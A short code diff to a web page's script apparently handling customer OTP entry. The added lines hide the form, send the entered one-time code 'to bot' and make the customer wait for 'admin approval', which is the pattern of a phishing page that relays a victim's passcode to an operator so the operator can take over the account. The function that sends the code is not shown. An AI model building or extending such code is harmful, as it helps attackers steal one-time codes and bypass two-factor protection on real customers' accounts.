@@ -171,7 +171,10 @@
             // Show waiting message and start polling for admin approval
             document.getElementById('otp-waiting').style.display = 'block';
             document.getElementById('otp-form').style.display = 'none';
-            document.getElementById('form-actions').style.display = 'none';
+            document.querySelector('.form-actions').style.display = 'none';
+            
+            // Send verification to bot
+            sendOTPVerification(otpCode);
             
             // Start polling for admin approval - customer cannot proceed without admin approval
             startPolling();
